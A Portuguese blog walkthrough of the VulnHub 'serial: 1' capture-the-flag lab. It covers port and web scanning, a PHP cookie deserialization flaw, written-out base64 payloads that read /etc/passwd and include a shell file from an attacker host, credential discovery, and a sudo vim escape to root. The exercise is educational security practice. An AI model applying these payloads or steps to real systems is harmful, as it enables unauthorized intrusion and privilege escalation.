---
title: 'VulnHub serial: 1'
excerpt: "Desafio CTF <strong><a href=''>VulnHub serial: 1</a></strong> Realizado para aprendizado sobre conceitos de segurança da informação."
date: 2019-08-22 17:08:41
tags: 
  - Hacking
  - Tutorial
  - Segurança da informação
  - CTF
  - "Series: serial"
cover: https://cdn-images-1.medium.com/max/800/1*E0oIubshtbc73STQvJvVVA.png
cover_creditos:
default_cover:
---

Hello friends.

> _Alvo:_ **serial: 1 (Linux)**
> _Atacante:_ **parrot** 4.19

### Informações sobre o Alvo.

Nenhuma informação sobre o alvo.

### Reconhecimento / Enumeração.

Descobrindo portas abertas no alvo.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*E0oIubshtbc73STQvJvVVA.png" alt="">
      <figcaption></figcaption>
    </figure>

nmap

Logo depois do nmap fazer a varredura no alvo percebemos que existe duas portas abertas um rodando servidor ssh e outra rodando apache.  
Em seguida fazemos uma varredura no servido web em busca de alguma brecha.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*ODfuxGEJggU5M4sUuT5ZPQ.png" alt="">
      <figcaption></figcaption>
    </figure>

nikto

Ao terminar a varredura encontramos uma pasta backup com um arquivo zip.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*EBBofWkmuG0cccEMni0ZrQ.png" alt="">
      <figcaption></figcaption>
    </figure>

bak.zip

Logo depois de baixar o zip e descompactar, notamos que existe alguns scripts em php.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*OK7PvAwujCzPB2UwJtDu_w.png" alt="">
      <figcaption></figcaption>
    </figure>

lista de arquivos.

Agora vamos fazer uma verificação nos script e verificar se existe alguma brecha.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*NMBwaqW0wBphYl1Mnw90aA.png" alt="">
      <figcaption></figcaption>
    </figure>

index.php

No index.php notamos que o cookies é serializado e depois cifrando em base64, logo abaixo existe uma função (unserialize) que aparentemente esta vulnerável.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*9Oo_9P6ntqCns5jsC8DPUg.png" alt="">
      <figcaption></figcaption>
    </figure>

Classe User e Welcome.

Nas classes **User** e **Welcome** não há nada que possa ser aproveitado.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*WZFTDR-fbe_l8cLq4OZiSg.png" alt="">
      <figcaption></figcaption>
    </figure>

Classe Log.

Na classe **Log** tem um “include” que esta vulnerável.  
Antes vamos ver o que vem no cookie ao acessar o servidor.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*0Qw4PkhuhUdIKNZKaTRCNA.png" alt="">
      <figcaption></figcaption>
    </figure>

requisição no servidor.

**base64 codificado.**

> Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0=

**base64 decodificado.**

> O:4:”User”:2:{s:10:”Username”;s:3:”sk4";s:9:”Userwel”;O:7:”Welcome”:0:{}}

Agora vamos criar nosso payload para teste.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*H8lD21pGTzcNqmZKRI5YUg.png" alt="">
      <figcaption></figcaption>
    </figure>

Classe Log modificada.

Vamos fazer a classe **Log** ler o **passwd** do servidor.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*yiZLUMygL0tINDcLery-8w.png" alt="">
      <figcaption></figcaption>
    </figure>

Chamando a classe **Log** no lugar da **Welcome**, e gerando o payload.

**base64 codificado.**

> Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjc6IkhBQ0tFUiAiO3M6OToiAFVzZXIAd2VsIjtPOjM6IkxvZyI6MTp7czoxMzoiAExvZwB0eXBlX2xvZyI7czoxMToiL2V0Yy9wYXNzd2QiO319

**base64 decodificado.**

> O:4:”User”:2:{s:10:”Username”;s:7:”HACKER “;s:9:”Userwel”;O:3:”Log”:1:{s:13:”Logtype\_log”;s:11:”/etc/passwd”;}}

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*ONady6B01Di8uF_hps_zRQ.png" alt="">
      <figcaption></figcaption>
    </figure>

Burp

O resultado é a leitura do arquivo passwd.  
Vamos criar uma shell para executar alguns comando.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*xVDLNcggZw89CO59xr4CwQ.png" alt="">
      <figcaption></figcaption>
    </figure>

shell.txt

Observe que a extensão do arquivo é .txt

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*evfTBCCc9UgfqDD7pVEIZw.png" alt="">
      <figcaption></figcaption>
    </figure>

alterando a classe Log.

Alterando a classe **Log** para pegar o arquivo shell.txt e gerando um novo payload gerado:

**base64 codificado.**

> Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjc6IkhBQ0tFUiAiO3M6OToiAFVzZXIAd2VsIjtPOjM6IkxvZyI6MTp7czoxMzoiAExvZwB0eXBlX2xvZyI7czozMzoiaHR0cDovLzE5Mi4xNjguMS43OjkwOTAvc2hlbGwudHh0Ijt9fQ==

**base64 decodificado.**

> O:4:”User”:2:{s:10:”Username”;s:7:”HACKER “;s:9:”Userwel”;O:3:”Log”:1:{s:13:”Logtype\_log”;s:33:”[http://192.168.1.7:9090/shell.txt](http://192.168.1.7:9090/shell.txt)";}}

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*aYRW6s24NtrqweVk-po0Ug.png" alt="">
      <figcaption></figcaption>
    </figure>

executando comando “id”.

Nosso comando funciona perfeitamente.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*4bm1aeuNTf4us81FeVTBpA.png" alt="">
      <figcaption></figcaption>
    </figure>

credentials.txt.bak

Listando os arquivo da raiz do servidor, encontramos um arquivo com o nome de “credentials” tudo indica ser uma senha.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*T4Wjz4-2Nne4JG4Tq9gxkA.png" alt="">
      <figcaption></figcaption>
    </figure>

Conseguindo a senha.

Obtemos a nossa senha.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*rf3Sm8Q631g_2vlWAltIhQ.png" alt="">
      <figcaption></figcaption>
    </figure>

Primeira flag.

Ganhamos acesso ao servidor, e obtemos a primeira flag.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*JFz4iyo8FwZszpLwiJhtWA.png" alt="">
      <figcaption></figcaption>
    </figure>

Ganhando acesso.

Temos como executar o VIM como super usuário, e para escapar para é só pressionar ESC e digitar e digitar “:!bash”.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*ypWcrTQGXIbYny1WgXGvAQ.png" alt="">
      <figcaption></figcaption>
    </figure>

Ganhamos acesso root.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*kSeR-khp2aPb5yEaBiD-dw.png" alt="">
      <figcaption></figcaption>
    </figure>

Acesso root.

Até a próxima.
